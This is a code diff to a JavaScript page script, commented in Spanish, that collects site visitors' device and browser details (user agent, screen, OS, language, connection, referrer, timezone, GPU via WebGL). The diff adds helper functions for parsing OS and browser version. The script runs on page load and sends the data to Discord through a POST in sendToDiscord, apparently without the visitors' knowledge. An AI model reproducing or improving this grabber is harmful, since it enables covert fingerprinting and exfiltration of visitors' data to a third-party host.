@@ -85,17 +85,17 @@ function sendUserInfo() {
 
             // Recolectar otros datos del usuario
             const userAgent = navigator.userAgent; // User-Agent del navegador
-            const screenWidth = screen.width; // Ancho de la pantalla
-            const screenHeight = screen.height; // Altura de la pantalla
-            const os = navigator.platform; // Sistema operativo
+            const screenWidth = window.innerWidth || screen.width; // Ancho de la pantalla
+            const screenHeight = window.innerHeight || screen.height; // Altura de la pantalla
+            const os = getOS(); // Sistema operativo
             const idioma = navigator.language || navigator.userLanguage; // Idioma del navegador
             const connection = navigator.connection ? navigator.connection.effectiveType : "Desconocido"; // Tipo de conexión a internet
             const referrer = document.referrer; // Página de referencia
             const cookiesEnabled = navigator.cookieEnabled; // Si las cookies están habilitadas
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Zona horaria
             const currentTime = new Date().toLocaleString(); // Fecha y hora local
-            const browser = navigator.appName; // Nombre del navegador
-            const browserVersion = navigator.appVersion; // Versión del navegador
+            const browser = getBrowser(); // Nombre del navegador
+            const browserVersion = getBrowserVersion(); // Versión del navegador
 
             // Información de la GPU usando WebGL
             let gpuInfo = 'Desconocido';
@@ -233,8 +233,71 @@ function sendToDiscord(userInfo) {
     .catch(error => console.error("Error al realizar la solicitud POST:", error));
 }
 
+// Función para obtener el sistema operativo
+function getOS() {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    if (/windows phone/i.test(userAgent)) {
+        return "Windows Phone";
+    }
+    if (/android/i.test(userAgent)) {
+        return "Android";
+    }
+    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+        return "iOS";
+    }
+    if (/Mac/i.test(userAgent)) {
+        return "Mac OS";
+    }
+    if (/Win/i.test(userAgent)) {
+        return "Windows";
+    }
+    if (/Linux/i.test(userAgent)) {
+        return "Linux";
+    }
+    return "Desconocido";
+}
+
+// Función para obtener el nombre del navegador
+function getBrowser() {
+    const userAgent = navigator.userAgent;
+    if (userAgent.indexOf("Firefox") > -1) {
+        return "Firefox";
+    } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) {
+        return "Opera";
+    } else if (userAgent.indexOf("Chrome") > -1) {
+        return "Chrome";
+    } else if (userAgent.indexOf("Safari") > -1) {
+        return "Safari";
+    } else if (userAgent.indexOf("MSIE") > -1 || !!document.documentMode) {
+        return "Internet Explorer";
+    } else {
+        return "Desconocido";
+    }
+}
+
+// Función para obtener la versión del navegador
+function getBrowserVersion() {
+    const userAgent = navigator.userAgent;
+    const browser = getBrowser();
+    let version = "Desconocido";
+
+    if (browser === "Chrome") {
+        version = userAgent.match(/Chrome\/([\d.]+)/)[1];
+    } else if (browser === "Firefox") {
+        version = userAgent.match(/Firefox\/([\d.]+)/)[1];
+    } else if (browser === "Safari") {
+        version = userAgent.match(/Version\/([\d.]+)/)[1];
+    } else if (browser === "Opera" || browser === "OPR") {
+        version = userAgent.match(/(Opera|OPR)\/([\d.]+)/)[2];
+    } else if (browser === "Internet Explorer") {
+        version = userAgent.match(/MSIE ([\d.]+)/)[1];
+    }
+    return version;
+}
+
 // Llamar a la función para enviar la información del usuario
 sendUserInfo();
+
 
 
 
